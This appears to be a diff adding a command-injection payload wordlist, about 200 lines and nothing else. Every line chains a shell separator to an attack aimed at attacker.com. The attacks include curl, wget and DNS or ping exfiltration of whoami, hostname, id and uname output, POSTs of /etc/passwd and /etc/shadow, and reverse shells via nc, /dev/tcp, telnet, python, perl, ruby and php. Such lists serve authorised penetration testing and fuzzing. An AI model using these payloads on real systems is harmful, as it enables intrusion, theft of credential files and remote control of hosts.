@@ -1,0 +1,203 @@
+; curl http://attacker.com/$(whoami)
+; wget http://attacker.com/$(whoami)
+; curl http://attacker.com/$(hostname)
+; wget http://attacker.com/$(hostname)
+| curl http://attacker.com/$(whoami)
+| wget http://attacker.com/$(whoami)
+| curl http://attacker.com/$(hostname)
+| wget http://attacker.com/$(hostname)
+|| curl http://attacker.com/$(whoami)
+|| wget http://attacker.com/$(whoami)
+|| curl http://attacker.com/$(hostname)
+|| wget http://attacker.com/$(hostname)
+& curl http://attacker.com/$(whoami)
+& wget http://attacker.com/$(whoami)
+& curl http://attacker.com/$(hostname)
+& wget http://attacker.com/$(hostname)
+&& curl http://attacker.com/$(whoami)
+&& wget http://attacker.com/$(whoami)
+&& curl http://attacker.com/$(hostname)
+&& wget http://attacker.com/$(hostname)
+; nslookup $(whoami).attacker.com
+; nslookup $(hostname).attacker.com
+; nslookup $(id).attacker.com
+| nslookup $(whoami).attacker.com
+| nslookup $(hostname).attacker.com
+| nslookup $(id).attacker.com
+|| nslookup $(whoami).attacker.com
+|| nslookup $(hostname).attacker.com
+|| nslookup $(id).attacker.com
+& nslookup $(whoami).attacker.com
+& nslookup $(hostname).attacker.com
+& nslookup $(id).attacker.com
+&& nslookup $(whoami).attacker.com
+&& nslookup $(hostname).attacker.com
+&& nslookup $(id).attacker.com
+; dig $(whoami).attacker.com
+; dig $(hostname).attacker.com
+; dig $(id).attacker.com
+| dig $(whoami).attacker.com
+| dig $(hostname).attacker.com
+| dig $(id).attacker.com
+|| dig $(whoami).attacker.com
+|| dig $(hostname).attacker.com
+|| dig $(id).attacker.com
+& dig $(whoami).attacker.com
+& dig $(hostname).attacker.com
+& dig $(id).attacker.com
+&& dig $(whoami).attacker.com
+&& dig $(hostname).attacker.com
+&& dig $(id).attacker.com
+; host $(whoami).attacker.com
+; host $(hostname).attacker.com
+| host $(whoami).attacker.com
+| host $(hostname).attacker.com
+|| host $(whoami).attacker.com
+|| host $(hostname).attacker.com
+& host $(whoami).attacker.com
+& host $(hostname).attacker.com
+&& host $(whoami).attacker.com
+&& host $(hostname).attacker.com
+; ping -c 1 $(whoami).attacker.com
+; ping -c 1 $(hostname).attacker.com
+| ping -c 1 $(whoami).attacker.com
+| ping -c 1 $(hostname).attacker.com
+|| ping -c 1 $(whoami).attacker.com
+|| ping -c 1 $(hostname).attacker.com
+& ping -c 1 $(whoami).attacker.com
+& ping -c 1 $(hostname).attacker.com
+&& ping -c 1 $(whoami).attacker.com
+&& ping -c 1 $(hostname).attacker.com
+; ping -n 1 $(whoami).attacker.com
+; ping -n 1 $(hostname).attacker.com
+| ping -n 1 $(whoami).attacker.com
+| ping -n 1 $(hostname).attacker.com
+|| ping -n 1 $(whoami).attacker.com
+|| ping -n 1 $(hostname).attacker.com
+& ping -n 1 $(whoami).attacker.com
+& ping -n 1 $(hostname).attacker.com
+&& ping -n 1 $(whoami).attacker.com
+&& ping -n 1 $(hostname).attacker.com
+; curl http://attacker.com/?x=$(cat /etc/passwd | base64)
+; wget http://attacker.com/?x=$(cat /etc/passwd | base64)
+| curl http://attacker.com/?x=$(cat /etc/passwd | base64)
+| wget http://attacker.com/?x=$(cat /etc/passwd | base64)
+|| curl http://attacker.com/?x=$(cat /etc/passwd | base64)
+|| wget http://attacker.com/?x=$(cat /etc/passwd | base64)
+& curl http://attacker.com/?x=$(cat /etc/passwd | base64)
+& wget http://attacker.com/?x=$(cat /etc/passwd | base64)
+&& curl http://attacker.com/?x=$(cat /etc/passwd | base64)
+&& wget http://attacker.com/?x=$(cat /etc/passwd | base64)
+; curl http://attacker.com:8080/$(uname -a)
+; wget http://attacker.com:8080/$(uname -a)
+| curl http://attacker.com:8080/$(uname -a)
+| wget http://attacker.com:8080/$(uname -a)
+|| curl http://attacker.com:8080/$(uname -a)
+|| wget http://attacker.com:8080/$(uname -a)
+& curl http://attacker.com:8080/$(uname -a)
+& wget http://attacker.com:8080/$(uname -a)
+&& curl http://attacker.com:8080/$(uname -a)
+&& wget http://attacker.com:8080/$(uname -a)
+; nc attacker.com 4444 -e /bin/sh
+; nc attacker.com 4444 -c /bin/sh
+; ncat attacker.com 4444 -e /bin/sh
+| nc attacker.com 4444 -e /bin/sh
+| nc attacker.com 4444 -c /bin/sh
+| ncat attacker.com 4444 -e /bin/sh
+|| nc attacker.com 4444 -e /bin/sh
+|| nc attacker.com 4444 -c /bin/sh
+|| ncat attacker.com 4444 -e /bin/sh
+& nc attacker.com 4444 -e /bin/sh
+& nc attacker.com 4444 -c /bin/sh
+& ncat attacker.com 4444 -e /bin/sh
+&& nc attacker.com 4444 -e /bin/sh
+&& nc attacker.com 4444 -c /bin/sh
+&& ncat attacker.com 4444 -e /bin/sh
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+; sh -i >& /dev/tcp/attacker.com/4444 0>&1
+| bash -i >& /dev/tcp/attacker.com/4444 0>&1
+| sh -i >& /dev/tcp/attacker.com/4444 0>&1
+|| bash -i >& /dev/tcp/attacker.com/4444 0>&1
+|| sh -i >& /dev/tcp/attacker.com/4444 0>&1
+& bash -i >& /dev/tcp/attacker.com/4444 0>&1
+& sh -i >& /dev/tcp/attacker.com/4444 0>&1
+&& bash -i >& /dev/tcp/attacker.com/4444 0>&1
+&& sh -i >& /dev/tcp/attacker.com/4444 0>&1
+; telnet attacker.com 4444 | /bin/sh
+; telnet attacker.com 4444 | /bin/bash
+| telnet attacker.com 4444 | /bin/sh
+| telnet attacker.com 4444 | /bin/bash
+|| telnet attacker.com 4444 | /bin/sh
+|| telnet attacker.com 4444 | /bin/bash
+& telnet attacker.com 4444 | /bin/sh
+& telnet attacker.com 4444 | /bin/bash
+&& telnet attacker.com 4444 | /bin/sh
+&& telnet attacker.com 4444 | /bin/bash
+; curl -d "data=$(whoami)" http://attacker.com/receive
+; wget --post-data="data=$(whoami)" http://attacker.com/receive
+| curl -d "data=$(whoami)" http://attacker.com/receive
+| wget --post-data="data=$(whoami)" http://attacker.com/receive
+|| curl -d "data=$(whoami)" http://attacker.com/receive
+|| wget --post-data="data=$(whoami)" http://attacker.com/receive
+& curl -d "data=$(whoami)" http://attacker.com/receive
+& wget --post-data="data=$(whoami)" http://attacker.com/receive
+&& curl -d "data=$(whoami)" http://attacker.com/receive
+&& wget --post-data="data=$(whoami)" http://attacker.com/receive
+; curl -X POST -d @/etc/passwd http://attacker.com/receive
+; curl -X POST -d @/etc/shadow http://attacker.com/receive
+| curl -X POST -d @/etc/passwd http://attacker.com/receive
+| curl -X POST -d @/etc/shadow http://attacker.com/receive
+|| curl -X POST -d @/etc/passwd http://attacker.com/receive
+|| curl -X POST -d @/etc/shadow http://attacker.com/receive
+& curl -X POST -d @/etc/passwd http://attacker.com/receive
+& curl -X POST -d @/etc/shadow http://attacker.com/receive
+&& curl -X POST -d @/etc/passwd http://attacker.com/receive
+&& curl -X POST -d @/etc/shadow http://attacker.com/receive
+; nslookup `whoami`.attacker.com
+; nslookup `hostname`.attacker.com
+| nslookup `whoami`.attacker.com
+| nslookup `hostname`.attacker.com
+|| nslookup `whoami`.attacker.com
+|| nslookup `hostname`.attacker.com
+& nslookup `whoami`.attacker.com
+& nslookup `hostname`.attacker.com
+&& nslookup `whoami`.attacker.com
+&& nslookup `hostname`.attacker.com
+; curl http://attacker.com/$(pwd | tr '/' '-')
+; wget http://attacker.com/$(pwd | tr '/' '-')
+| curl http://attacker.com/$(pwd | tr '/' '-')
+| wget http://attacker.com/$(pwd | tr '/' '-')
+|| curl http://attacker.com/$(pwd | tr '/' '-')
+|| wget http://attacker.com/$(pwd | tr '/' '-')
+& curl http://attacker.com/$(pwd | tr '/' '-')
+& wget http://attacker.com/$(pwd | tr '/' '-')
+&& curl http://attacker.com/$(pwd | tr '/' '-')
+&& wget http://attacker.com/$(pwd | tr '/' '-')
+; curl -A "User-Agent: $(whoami)" http://attacker.com
+; wget --user-agent="$(whoami)" http://attacker.com
+| curl -A "User-Agent: $(whoami)" http://attacker.com
+| wget --user-agent="$(whoami)" http://attacker.com
+|| curl -A "User-Agent: $(whoami)" http://attacker.com
+|| wget --user-agent="$(whoami)" http://attacker.com
+& curl -A "User-Agent: $(whoami)" http://attacker.com
+& wget --user-agent="$(whoami)" http://attacker.com
+&& curl -A "User-Agent: $(whoami)" http://attacker.com
+&& wget --user-agent="$(whoami)" http://attacker.com
+; curl http://attacker.com -H "X-Data: $(id)"
+; wget http://attacker.com --header="X-Data: $(id)"
+| curl http://attacker.com -H "X-Data: $(id)"
+| wget http://attacker.com --header="X-Data: $(id)"
+|| curl http://attacker.com -H "X-Data: $(id)"
+|| wget http://attacker.com --header="X-Data: $(id)"
+& curl http://attacker.com -H "X-Data: $(id)"
+& wget http://attacker.com --header="X-Data: $(id)"
+&& curl http://attacker.com -H "X-Data: $(id)"
+&& wget http://attacker.com --header="X-Data: $(id)"
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'
+| perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'
+; ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+| ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+| php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
